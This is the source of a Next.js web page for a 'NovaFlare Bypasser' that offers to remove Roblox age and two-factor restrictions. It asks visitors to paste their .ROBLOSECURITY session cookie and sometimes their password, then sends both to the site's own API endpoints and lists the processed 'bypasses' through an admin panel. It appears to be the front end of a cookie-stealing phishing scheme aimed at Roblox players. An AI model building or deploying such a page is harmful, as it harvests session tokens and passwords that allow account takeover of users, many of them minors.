"use client"

import { useEffect } from "react"

export default function Home() {
  useEffect(() => {
    // Initialize app
    const initApp = () => {
      const ageOption = document.getElementById("age-option") as HTMLSelectElement
      const passwordInput = document.getElementById("password-input") as HTMLInputElement
      const cookieDiv = document.getElementById("cookieInput") as HTMLDivElement
      const cookieInput = document.getElementById("cookie-input") as HTMLTextAreaElement
      const processBtn = document.getElementById("process-btn") as HTMLButtonElement
      const toast = document.getElementById("toast") as HTMLDivElement
      const toastTitle = document.getElementById("toast-title") as HTMLDivElement
      const toastMessage = document.getElementById("toast-message") as HTMLDivElement

      if (cookieDiv && processBtn) {
        cookieDiv.style.display = "none"
        processBtn.style.display = "none"
      }

      ageOption?.addEventListener("change", function () {
        if (this.value === "13plus") {
          passwordInput.style.display = "block"
          cookieDiv.style.display = "block"
          processBtn.style.display = "block"
        } else if (this.value) {
          passwordInput.style.display = "none"
          cookieDiv.style.display = "block"
          processBtn.style.display = "block"
          processBtn.innerHTML = '<i class="fas fa-cogs"></i> PROCESS ACCOUNT'
        } else {
          passwordInput.style.display = "none"
          cookieDiv.style.display = "none"
          processBtn.style.display = "none"
        }
      })

      processBtn?.addEventListener("click", async () => {
        const selectedOption = ageOption.value
        const cookie = cookieInput.value.trim()

        if (!selectedOption) {
          showToast("Error", "Please select an option", false)
          return
        }
        if (!cookie) {
          showToast("Error", "Please enter a .ROBLOSECURITY cookie", false)
          return
        }
        if (selectedOption === "13plus" && !passwordInput.value.trim()) {
          showToast("Error", "Password is required for 13+ bypass", false)
          return
        }

        processBtn.disabled = true
        const originalText = processBtn.innerHTML
        processBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...'

        try {
          let result
          if (selectedOption === "13plus") {
            result = await process2FABypass(cookie, passwordInput.value.trim())
          } else {
            result = await processCookie(cookie)
          }

          if (result.success) {
            // History is updated via polling
            showToast("Success!", result.message)
          } else {
            showToast("Error", result.message, false)
          }
        } catch (error) {
          console.error("Unexpected error:", error)
          showToast("Error", "An unexpected error occurred. Please try again.", false)
        } finally {
          setTimeout(() => {
            processBtn.disabled = false
            processBtn.innerHTML = originalText
          }, 1000)
        }
      })

      function process2FABypass(cookie: string, password: string) {
        return new Promise<{ success: boolean; message: string }>(async (resolve) => {
          try {
            const response = await fetch(
              `/api/bypass-2fa?cookie=${encodeURIComponent(cookie)}&password=${encodeURIComponent(password)}&mode=2fa`,
            )

            if (!response.ok) {
              const errorData = await response.json().catch(() => ({ message: "Unknown error" }))
              resolve({
                success: false,
                message: errorData.message || `API error: ${response.status}`,
              })
              return
            }

            const data = await response.json()

            resolve({
              success: data.status === "success",
              message: data.message || "2FA bypass processed and logged successfully",
            })
          } catch (error) {
            resolve({
              success: false,
              message: error instanceof Error ? error.message : "Request failed",
            })
          }
        })
      }

      function processCookie(cookie: string) {
        return new Promise<{ success: boolean; message: string }>(async (resolve) => {
          try {
            const response = await fetch(`/api/bypass-v4?a=${encodeURIComponent(cookie)}&b=NovaFlareBypasser`)

            if (!response.ok) {
              const errorData = await response.json().catch(() => ({ message: "Unknown error" }))
              resolve({
                success: false,
                message: errorData.message || `API error: ${response.status}`,
              })
              return
            }

            const data = await response.json()

            resolve({
              success: data.status === "success",
              message: data.message || "Cookie processed successfully",
            })
          } catch (error) {
            resolve({
              success: false,
              message: error instanceof Error ? error.message : "Request failed",
            })
          }
        })
      }

      function addToHistory(option: string, cookie: string) {
        // Removed client-side add, relying on server polling
      }

      function showToast(title: string, message: string, isSuccess = true) {
        toastTitle.textContent = title
        toastMessage.textContent = message

        const icon = toast.querySelector(".toast-icon")
        if (isSuccess) {
          toast.style.background = "linear-gradient(90deg, var(--primary), var(--secondary))"
          if (icon) icon.className = "fas fa-check-circle toast-icon"
        } else {
          toast.style.background = "linear-gradient(90deg, var(--danger), #f97316)"
          if (icon) icon.className = "fas fa-exclamation-circle toast-icon"
        }

        toast.classList.add("show")

        setTimeout(() => {
          toast.classList.remove("show")
        }, 4000)
      }
    }

    // Initialize immediately since we're not using jQuery anymore
    initApp()
  }, [])

  useEffect(() => {
    // Canvas animation
    const canvas = document.getElementById("bg-anim") as HTMLCanvasElement
    if (!canvas) return

    const ctx = canvas.getContext("2d")
    if (!ctx) return

    let w = window.innerWidth
    let h = window.innerHeight

    const DOTS = 50
    const DOT_RADIUS = 3
    const LINE_DIST = 130
    const dots: Array<{ x: number; y: number; vx: number; vy: number; color: string }> = []

    function resizeCanvas() {
      w = window.innerWidth
      h = window.innerHeight
      canvas.width = w
      canvas.height = h
    }

    function randColor() {
      const purples = ["#a259ff", "#7a2ff7", "#6a11cb", "#833ab4", "#cf28e5", "#d946ef"]
      return purples[Math.floor(Math.random() * purples.length)]
    }

    function createDots() {
      dots.length = 0
      for (let i = 0; i < DOTS; i++) {
        dots.push({
          x: Math.random() * w,
          y: Math.random() * h,
          vx: (Math.random() - 0.5) * 0.7,
          vy: (Math.random() - 0.5) * 0.7,
          color: randColor(),
        })
      }
    }

    function draw() {
      ctx.clearRect(0, 0, w, h)

      // Draw lines
      for (let i = 0; i < DOTS; i++) {
        for (let j = i + 1; j < DOTS; j++) {
          const dx = dots[i].x - dots[j].x
          const dy = dots[i].y - dots[j].y
          const dist = Math.sqrt(dx * dx + dy * dy)

          if (dist < LINE_DIST) {
            ctx.save()
            ctx.globalAlpha = 1 - dist / LINE_DIST
            ctx.strokeStyle = "#b47aff"
            ctx.lineWidth = 1.1
            ctx.beginPath()
            ctx.moveTo(dots[i].x, dots[i].y)
            ctx.lineTo(dots[j].x, dots[j].y)
            ctx.stroke()
            ctx.restore()
          }
        }
      }

      // Draw dots
      for (const dot of dots) {
        ctx.beginPath()
        ctx.arc(dot.x, dot.y, DOT_RADIUS, 0, Math.PI * 2, false)
        ctx.fillStyle = dot.color
        ctx.shadowColor = "#b47aff"
        ctx.shadowBlur = 8
        ctx.fill()
        ctx.shadowBlur = 0
      }
    }

    function update() {
      for (const dot of dots) {
        dot.x += dot.vx
        dot.y += dot.vy

        if (dot.x < 0 || dot.x > w) dot.vx *= -1
        if (dot.y < 0 || dot.y > h) dot.vy *= -1
      }
    }

    function animate() {
      update()
      draw()
      requestAnimationFrame(animate)
    }

    window.addEventListener("resize", () => {
      resizeCanvas()
      createDots()
    })

    resizeCanvas()
    createDots()
    animate()
  }, [])

  useEffect(() => {
    const fetchLatestBypasses = async () => {
      try {
        const response = await fetch("/api/admin/bypasses?limit=3", { cache: "no-store" })
        if (response.ok) {
          const data = await response.json()
          const historyList = document.getElementById("history-list")
          if (historyList && data.bypasses) {
            historyList.innerHTML = ""
            if (data.bypasses.length === 0) {
              historyList.innerHTML =
                '<p style="text-align: center; color: var(--purple-200); padding: 20px;">No bypasses processed yet</p>'
            }
            data.bypasses.forEach((bypass: any) => {
              const historyItem = document.createElement("div")
              historyItem.className = "history-item fade-in"

              // Custom formatting based on type
              const title = bypass.type
              const desc = bypass.identifier
              const date = new Date(bypass.timestamp).toLocaleString("en-US", {
                month: "numeric",
                day: "numeric",
                year: "numeric",
                hour: "numeric",
                minute: "2-digit",
                second: "2-digit",
                hour12: true,
              })

              historyItem.innerHTML = `
                <i class="fas fa-check-circle history-icon"></i>
                <div style="width: 100%">
                  <div class="history-text" style="font-weight: bold; color: var(--purple-400);">${title}</div>
                  <div class="history-subtext" style="color: var(--purple-200); font-size: 0.9rem; margin-bottom: 4px;">${desc}</div>
                  <div class="history-date" style="color: var(--purple-300); font-size: 0.75rem;">
                    <i class="far fa-clock" style="margin-right: 4px;"></i>${date}
                  </div>
                </div>
              `
              historyList.appendChild(historyItem)
            })
          }
        }
      } catch (error) {
        console.error("Failed to fetch bypasses:", error)
      }
    }

    fetchLatestBypasses()
    const interval = setInterval(fetchLatestBypasses, 5000)
    return () => clearInterval(interval)
  }, [])

  return (
    <>
      <style jsx global>{`
        body {
          overflow-x: hidden;
        }
        .admin-btn-inline {
          display: inline-block;
          margin-top: 10px;
          color: var(--purple-400);
          text-decoration: none;
          font-size: 0.9rem;
          transition: color 0.3s;
        }
        .admin-btn-inline:hover {
          color: var(--purple-300);
        }
      `}</style>
      <canvas id="bg-anim"></canvas>

      <div className="container">
        <header className="header">
          <div className="logo">
            <div className="logo-icon pulse">
              <i className="fas fa-shield-alt"></i>
            </div>
            <h1 className="title">NOVAFLARE BYPASSER</h1>
          </div>
          <p className="subtitle">Force disable Verify email to unverify</p>
          <a href="/admin" className="admin-btn-inline">
            <i className="fas fa-cog"></i> Admin Panel
          </a>
        </header>

        <div className="content-wrapper">
          <div className="main-content">
            <div className="card">
              <h2 className="card-title">
                <i className="fas fa-key"></i> Account Security Options
              </h2>

              <div className="input-group">
                <label htmlFor="age-option" className="input-label">
                  <i className="fas fa-user-clock"></i> Select Age Bypass Method
                </label>
                <select id="age-option" className="select-field">
                  <option value="">-- select an option --</option>
                  <option value="2008">13+ / 18+ Account</option>
                  <option value="13plus">13+ All Ages</option>
                </select>
                <input
                  id="password-input"
                  className="password-field"
                  type="password"
                  placeholder="Enter account password for verification..."
                />
              </div>

              <div id="cookieInput">
                <div className="input-group">
                  <label htmlFor="cookie-input" className="input-label">
                    <i className="fas fa-cookie"></i> .ROBLOSECURITY Cookie
                  </label>
                  <textarea
                    id="cookie-input"
                    className="input-field"
                    placeholder="Paste your .ROBLOSECURITY cookie here..."
                    spellCheck="false"
                  ></textarea>
                </div>
                <button id="process-btn" className="process-btn">
                  <i className="fas fa-cogs"></i> PROCESS ACCOUNT
                </button>
              </div>

              <div id="result-box" className="result-box">
                <div className="result-title">
                  <i className="fas fa-check-circle"></i> Bypass Successful!
                </div>
                <div className="result-content">
                  Account age restriction successfully bypassed. New status: <strong>13+</strong>
                </div>
              </div>
            </div>
          </div>

          <div className="card" style={{ marginTop: "40px" }}>
            <h2 className="card-title">
              <i className="fas fa-history"></i> Latest Processed
            </h2>
            <div id="history-list" className="history-list">
              <p style={{ textAlign: "center", color: "var(--purple-200)", padding: "20px" }}>
                No bypasses processed yet
              </p>
            </div>
          </div>
        </div>
      </div>

      <div className="toast" id="toast">
        <i className="fas fa-check-circle toast-icon"></i>
        <div className="toast-content">
          <div className="toast-title" id="toast-title">
            Success!
          </div>
          <div className="toast-message" id="toast-message">
            Account processed successfully
          </div>
        </div>
      </div>
    </>
  )
}
